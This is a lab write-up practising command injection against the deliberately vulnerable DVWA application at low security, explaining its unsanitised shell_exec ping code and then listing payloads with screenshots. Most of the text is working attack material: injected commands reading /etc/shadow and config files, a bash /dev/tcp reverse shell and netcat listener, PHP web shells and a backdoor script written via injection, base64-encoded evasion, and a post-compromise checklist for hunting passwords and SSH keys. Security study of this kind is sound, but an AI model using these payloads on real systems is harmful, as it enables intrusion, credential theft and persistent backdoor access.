# Command Injection With DVWA Low level Security


## DVWA Low Level
- In this first we need to set `Level Security` to `low`, cause we test with DVWA:
<img width="813" height="649" alt="image" src="https://github.com/user-attachments/assets/92a5660a-b9ec-46f2-b20f-cc08b5957679" />


- Also in this i use it with my `Burp Suite`:


- Explain Brakdown:
````
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
````
- The server checks if the form was submitted (Submit button clicked)
- It takes the user’s input from `$_REQUEST['ip']` → this is untrusted data 

````
    // Determine OS and execute the ping command.
    if( stripos( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping -c 4 ' . $target );
    }
````
-  The server checks if it’s running on Windows or Linux/macOS
-  Then it builds a command string using the user’s input:
````
ping 127.0.0.1   # if Windows
ping -c 4 127.0.0.1   # if Linux
````
- In this No filtering, no escaping, no allowlist → Direct injection point! 

````
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
````
- The server runs the command with `shell_exec()` → which executes it in the system shell.
- Then displays the output to the user → attacker sees results of their injected commands.

---



## 1.  BASIC COMMAND INJECTION PAYLOADS

### Simple Command Execution
````
127.0.0.1;whoami
````
<img width="1120" height="607" alt="image" src="https://github.com/user-attachments/assets/c3e7d3b3-6069-4b9a-b94a-d96f73d44a97" />

- And back to our `Burp` we will see this:
<img width="1888" height="880" alt="image" src="https://github.com/user-attachments/assets/c367e1af-757f-498e-827a-a96720e5cf00" />

<img width="1887" height="841" alt="image" src="https://github.com/user-attachments/assets/2044c415-9ba7-48a1-9665-58b6cbde572e" />


- If we want to change to others `Payload`:
<img width="1887" height="846" alt="image" src="https://github.com/user-attachments/assets/1b488a0a-4766-4475-92c7-8f55f837b750" />

<img width="1582" height="805" alt="image" src="https://github.com/user-attachments/assets/30a14de8-9279-46fb-8d07-739b18b32de0" />


````
127.0.0.1; id
````
<img width="1578" height="777" alt="image" src="https://github.com/user-attachments/assets/beea1f14-3f4f-472f-9215-0b41da49edbb" />

- Select on it and Press `Ctrl + U` to encode it:
<img width="1918" height="672" alt="image" src="https://github.com/user-attachments/assets/2ea3b36d-5f17-4349-90f5-c99cfba503f7" />

<img width="1578" height="817" alt="image" src="https://github.com/user-attachments/assets/4f1876fd-0041-472c-be88-c0191acd2383" />

- In this we just not only on this we can use this with `Shell` like:
````
ping -c 3 8.8.8.8; whoami
ping -c 3 8.8.8.8;id 
````
<img width="1896" height="389" alt="image" src="https://github.com/user-attachments/assets/f973113e-81ac-4572-970e-06fca422f2f0" />


- Or we can go to our `DVWA` shell:
````
python commix.py -u "http://192.168.100.97:8080/vulnerabilities/exec/" --data="ip=test&Submit=Submit"  --batch
````
<img width="1907" height="516" alt="image" src="https://github.com/user-attachments/assets/9198df1c-d6c8-4a89-b760-5b499b3b5a1e" />

- Best Practice if we got thier `shell` just type direct command like `whoami`, `ls -la` or more...

---

### We can see the `Vulnerable code of PHP` and do follow this source:
<img width="834" height="683" alt="image" src="https://github.com/user-attachments/assets/b327c899-c2b4-474e-9362-0937ff377108" />



### Directory Operations
````
8.8.8.8; pwd
8.8.8.8; ls -la
8.8.8.8; ls /home
````
<img width="1918" height="827" alt="image" src="https://github.com/user-attachments/assets/fa645d63-4d76-4d4a-b30a-7abf95cf87bf" />

<img width="1581" height="780" alt="image" src="https://github.com/user-attachments/assets/f3ee10e9-6ca1-4131-a55b-1e849051cd53" />

- In `IP` we can use others IP that we can ``ping```. 

### System Information
- Also in this i used direct in browser:
````
127.0.0.1; uname -a
127.0.0.1; cat /etc/passwd
127.0.0.1; cat /etc/issue
````
<img width="798" height="443" alt="image" src="https://github.com/user-attachments/assets/591ce0f2-e666-4445-812f-037bfda8aada" />

<img width="808" height="631" alt="image" src="https://github.com/user-attachments/assets/18f7deb0-6a14-43b4-af90-59acae798ace" />


## 2. ADVANCED COMMAND INJECTION TECHNIQUES

### Multiple Commands
````
127.0.0.1; whoami; pwd; ls -la; id
````
<img width="802" height="580" alt="image" src="https://github.com/user-attachments/assets/d318a5c2-6f26-4747-a50b-087f97f29b04" />

- Command Chaining
````
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
````
- Payload: `127.0.0.1 && whoami`
<img width="796" height="441" alt="image" src="https://github.com/user-attachments/assets/519b8981-d469-4a91-a1ed-58c837dec15e" />

- `&&`: Run whoami only if 127.0.0.1 succeeds
- `||`: Run whoami only if 127.0.0.1 fails
- `|`: Pipe output of 127.0.0.1 into whoami (not meaningful here)


- Subshell Execution
````
127.0.0.1; $(whoami)
127.0.0.1; `whoami`
````
- Background Processes
````
127.0.0.1; whoami &
````
- All of this is the same above we just input `Payload` in command injection.
- `$(...)`: syntax runs the command inside the parentheses and substitutes its output.



---


## 3. FILE SYSTEM EXPLORATION

### View Important Files
````
127.0.0.1; cat /etc/passwd
127.0.0.1; cat /etc/shadow
127.0.0.1; cat /etc/hosts
127.0.0.1; cat /etc/group
````
- Payload: `127.0.0.1; cat /etc/passwd`
<img width="800" height="533" alt="image" src="https://github.com/user-attachments/assets/b585ebc3-dc5f-46fc-9fcb-8c4ab4ba0d0c" />


### Web Directory Exploration
````
127.0.0.1; ls /var/www/html
127.0.0.1; ls /var/www/html/dvwa
127.0.0.1; ls /var/www/html/dvwa/vulnerabilities
````
- Payload: `127.0.0.1; ls /var/www/html`
<img width="800" height="537" alt="image" src="https://github.com/user-attachments/assets/bd825d5c-8b04-4e2a-8f43-f35e28cecb0c" />



### Configuration Files
````
127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php
127.0.0.1; cat /etc/apache2/apache2.conf
127.0.0.1; cat /etc/php/7.4/apache2/php.ini
````
- Payload: `127.0.0.1; cat /etc/apache2/apache2.conf`
<img width="791" height="712" alt="image" src="https://github.com/user-attachments/assets/504def0b-c843-4c81-9769-c29ae73ec670" />


---



## 4. NETWORK INFORMATION

### Network Configuration
````
127.0.0.1; ifconfig
127.0.0.1; ip addr
127.0.0.1; netstat -tulpn
127.0.0.1; route -n
````
- Payload: `127.0.0.1; ip addr`
<img width="799" height="531" alt="image" src="https://github.com/user-attachments/assets/9bb18db6-0d87-4ced-ad05-bfdeed06c598" />


### Network Connections
````
127.0.0.1; netstat -an
127.0.0.1; ss -tulpn
127.0.0.1; lsof -i
````
- Payload: `127.0.0.1; ss -tulpn`
<img width="812" height="436" alt="image" src="https://github.com/user-attachments/assets/c86b4228-7fd6-473d-a9e5-3f9576eae89c" />


### DBS Information
````
127.0.0.1; cat /etc/resolv.conf
127.0.0.1; nslookup google.com
127.0.0.1; dig google.com
````
- Payload: `127.0.0.1; cat /etc/resolv.conf`
<img width="808" height="526" alt="image" src="https://github.com/user-attachments/assets/3a0f2484-fd8e-497d-ad40-f3c81d616ecb" />


---


## 5. USER AND PERMISSION ENUMERATION

### Current User Context
````
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; groups
````
- Payload: `127.0.0.1; groups`
<img width="818" height="443" alt="image" src="https://github.com/user-attachments/assets/8c4ea0d0-11c5-4879-88f1-46e6b77d80af" />

### Other Users
````
127.0.0.1; cat /etc/passwd | grep -v nologin
127.0.0.1; ls /home
127.0.0.1; getent passwd
````
- Payload: `127.0.0.1; cat /etc/passwd | grep -v nologin`
<img width="811" height="445" alt="image" src="https://github.com/user-attachments/assets/91ec8b86-7bbe-46e0-93e7-d508c4d1960d" />

-  Lists all user accounts except those with nologin shell (i.e., only users who can log in).



### Process Information
````
127.0.0.1; ps aux
127.0.0.1; top -n 1 -b
````
- Payload: `127.0.0.1; ps aux`
<img width="1362" height="540" alt="image" src="https://github.com/user-attachments/assets/801faec9-3708-431a-bfe1-6166f4189056" />



---


## 6.  DATA EXFILTRATION TECHNIQUES

### Base64 Encoding
````
127.0.0.1; cat /etc/passwd | base64
127.0.0.1; base64 /etc/shadow
````
- Payload: `127.0.0.1; cat /etc/passwd | base64`
<img width="795" height="528" alt="image" src="https://github.com/user-attachments/assets/9b59fa21-75e8-42fb-b6c0-1a31254f9e00" />




---



## 7.  REVERSE SHELL PAYLOADS

- First we need to do to use this `Reverse shell`, we need to use `netcat` for `listener`:
````
nc -nvlp 4444
````
<img width="416" height="205" alt="image" src="https://github.com/user-attachments/assets/05eb5d29-8acd-4013-bc59-b9103d6bf25e" />

- This listens for incoming reverse shell connections on port 4444.

### Bash Reverse Shell
````
8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
````
<img width="1747" height="658" alt="image" src="https://github.com/user-attachments/assets/570b15a9-fd2a-4ee3-a9b9-c9a21bd4ea0e" />

**Note:** `192.168.127.128` is target ip.
- IF we want to get `Reverse shell` just install extension name `hacktool`:
<img width="960" height="802" alt="image" src="https://github.com/user-attachments/assets/4cd43e42-ad9f-465e-843a-5e63af6b8727" />

- In this we got the target `shell`:
<img width="1005" height="844" alt="image" src="https://github.com/user-attachments/assets/2af77834-8f22-48be-b647-4f096cc485ac" />

#### Command that we can use after we got Shell:
| Step | Command                                           |                                         Purpose / Meaning | Example usage / what to look for                                                                |        |                                                         |
| ---: | ------------------------------------------------- | --------------------------------------------------------: | ----------------------------------------------------------------------------------------------- | ------ | ------------------------------------------------------- |
|    1 | `whoami`                                          |                          Show current effective username. | `whoami` → `www-data` (look if `root` or non‑privileged)                                        |        |                                                         |
|    2 | `id`                                              |                     Show uid, gid, and group memberships. | `id` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` (check secondary groups)         |        |                                                         |
|    3 | `hostname`                                        |                                   Show host machine name. | `hostname` (useful to identify target)                                                          |        |                                                         |
|    4 | `uname -a`                                        |                Kernel and OS info (kernel version, arch). | `uname -a` (look for old kernel / arch mismatches)                                              |        |                                                         |
|    5 | `cat /etc/os-release`                             |               Distribution and version info (if present). | `cat /etc/os-release` (identify distro and known CVEs)                                          |        |                                                         |
|    6 | `pwd`                                             |                                  Print working directory. | `pwd` (confirm where you are)                                                                   |        |                                                         |
|    7 | `env`                                             |                               List environment variables. | `env` (look for secrets: API keys, DB URLs)                                                     |        |                                                         |
|    8 | `ls -la`                                          |         List files with permissions in current directory. | `ls -la` (look for readable sensitive files)                                                    |        |                                                         |
|    9 | `ls -la /var/www/html`                            |       Inspect webroot contents and readable config files. | `ls -la /var/www/html` (look for config, uploads, backups)                                      |        |                                                         |
|   10 | `find / -name "*.bak" -o -name "*~" 2>/dev/null`  |          Find backup/temp files that may contain secrets. | `find / -name "*.bak" -o -name "*~" 2>/dev/null` (search for `.bak`/`~` files)                  |        |                                                         |
|   11 | `grep -R "password" /var/www 2>/dev/null`         |             Search web files for likely password strings. | `grep -R "password" /var/www` (scan for plaintext creds)                                        |        |                                                         |
|   12 | `cat /var/www/html/config/config.inc.php`         |                  Read web app config file (example path). | `cat /var/www/html/config/config.inc.php` (look for DB creds, keys)                             |        |                                                         |
|   13 | `ip addr`                                         |                 Show network interfaces and assigned IPs. | `ip addr` (find interface IPs, routing clues)                                                   |        |                                                         |
|   14 | `netstat -tulpn` **or** `ss -tulpn`               |            Show listening ports and associated processes. | `netstat -tulpn` (may need privileges) — identify exposed services and PID/program              |        |                                                         |
|   15 | `ps aux`                                          |                                   List running processes. | `ps aux` (look for suspicious or root processes)                                                |        |                                                         |
|   16 | `crontab -l`                                      |          Show current user's cron jobs (scheduled tasks). | `crontab -l` (check for scripts running as user)                                                |        |                                                         |
|   17 | `ls -la /etc/cron*`                               |                     Inspect system cron jobs and scripts. | `ls -la /etc/cron*` (check system scheduled scripts and permissions)                            |        |                                                         |
|   18 | `sudo -l`                                         |           List sudo privileges available to current user. | `sudo -l` (may prompt for password) — look for NOPASSWD entries or allowed binaries             |        |                                                         |
|   19 | `getcap -r / 2>/dev/null`                         | Find files with Linux capabilities (possible escalation). | `getcap -r / 2>/dev/null` (look for unexpected capabilities on binaries)                        |        |                                                         |
|   20 | `find / -type f -perm -4000 2>/dev/null`          |            Find SUID files (possible escalation vectors). | `find / -type f -perm -4000 2>/dev/null` (note uncommon SUID binaries)                          |        |                                                         |
|   21 | `dmesg                                            |                                               tail -n 50` | View recent kernel messages (may require privileges).                                           | `dmesg | tail -n 50` (check for hardware/driver errors, crashes) |
|   22 | `tail -n 200 /var/log/syslog`                     |              Inspect system logs (path varies by distro). | `tail -n 200 /var/log/syslog` (look for failed logins, service errors)                          |        |                                                         |
|   23 | `ls -la ~/.ssh` / `cat ~/.ssh/id_rsa.pub`         |           Look for SSH keys in the user's home directory. | `ls -la ~/.ssh` and `cat ~/.ssh/id_rsa.pub` (do not expose private keys; note presence of keys) |        |                                                         |
|   24 | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |    Spawn a PTY for a better interactive shell (lab only). | Run inside a reverse shell to get job control; useful for editors and signal handling           |        |                                                         |




- IF we want to details of shell go to our `hacktool`:  
<img width="933" height="748" alt="image" src="https://github.com/user-attachments/assets/9ed564ad-3efd-4904-a0f5-0dd620a529bb" />


---



##  8. FILE CREATION AND MANIPULATION
### Create Web Shell
````
127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
127.0.0.1; echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /var/www/html/cmd.php
````
### Create Backdoor
````
127.0.0.1; echo '#!/bin/bash' > /tmp/shell.sh
127.0.0.1; echo 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1' >> /tmp/shell.sh
127.0.0.1; chmod +x /tmp/shell.sh
````
### File Upload via echo
````
127.0.0.1; echo 'malicious content' > /var/www/html/backdoor.txt
````

- **Note**: All of this until we was created shell.

----



## 9. PRIVILEGE ESCALATION PREPARATION

### Kernel Information
````
127.0.0.1; uname -r
127.0.0.1; cat /proc/version
127.0.0.1; dpkg -l | grep linux-image
````
- Payload: `127.0.0.1; uname -r`
<img width="793" height="439" alt="image" src="https://github.com/user-attachments/assets/6949d4cb-1191-46be-9960-31ff64189cf0" />

- Payload: `127.0.0.1; cat /proc/version`
<img width="1361" height="443" alt="image" src="https://github.com/user-attachments/assets/e8a575ed-e10f-49c7-b6c3-27750d7c3e50" />


### SUID Binaries
````
127.0.0.1; find / -perm -4000 2>/dev/null
127.0.0.1; find / -user root -perm -4000 -exec ls -ldb {} \;
````
- Payload: `127.0.0.1; find / -perm -4000 2>/dev/null`
<img width="797" height="530" alt="image" src="https://github.com/user-attachments/assets/8d575b5a-6170-4904-ad9e-513d0166f2ce" />

### Writable Files
````
127.0.0.1; find / -writable 2>/dev/null | grep -v proc
127.0.0.1; find / -perm -222 -type d 2>/dev/null
````
- Payload: `127.0.0.1; find / -writable 2>/dev/null | grep -v proc`
<img width="794" height="710" alt="image" src="https://github.com/user-attachments/assets/b620b2ff-b0fd-410c-a5d9-844ac34afe38" />

---



## 10. FUN AND DEMONSTRATION PAYLOADS

### Visual Effects
````
127.0.0.1; ls --color=always
127.0.0.1; tree /
````
- Payload: `127.0.0.1; ls --color=always`
<img width="792" height="437" alt="image" src="https://github.com/user-attachments/assets/91a8c06a-0e5b-42cd-831a-c3e5c91cf616" />




### System Information Display
````
127.0.0.1; uptime
127.0.0.1; free -h
127.0.0.1; df -h
127.0.0.1; du -sh /var/www
````
- Payload: `127.0.0.1; uptime`
<img width="806" height="436" alt="image" src="https://github.com/user-attachments/assets/8af45717-34a6-4bec-aa82-f6b73c6c6d97" />



## 11.  DEFENSE EVASION

### Command Obfuscation
````
127.0.0.1; who`a`mi
127.0.0.1; w'h'o'a'm'i
127.0.0.1; whoam\i
````
- Payload: `127.0.0.1; whoam\i`
<img width="805" height="437" alt="image" src="https://github.com/user-attachments/assets/ec1cb3ef-5e64-4fe7-9107-45bf381c8b63" />

### Encoding Techniques
````
127.0.0.1; echo 'd2hvYW1p' | base64 -d | bash
127.0.0.1; $(echo "d2hvYW1p" | base64 -d)
````
<img width="798" height="440" alt="image" src="https://github.com/user-attachments/assets/735f07df-2a11-417d-a7c8-897d889df545" />

---


## 12. COMPREHENSIVE INFORMATION GATHERING

### One-Liner Comprehensive Scan
````
127.0.0.1; whoami; id; uname -a; cat /etc/issue; pwd; ls -la; ps aux; netstat -tulpn; ifconfig; cat /etc/passwd; sudo -l; find / -perm -4000 2>/dev/null; crontab -l; ls -la /etc/cron*; cat /etc/crontab
````
<img width="1362" height="767" alt="image" src="https://github.com/user-attachments/assets/1b118131-40ce-4a2c-b89c-42e190deb7ec" />

-----


---

## Finished of Command Injection DVWA Low Level

---

---

## Practice By: Nin Kanong (k4n0ng)

---
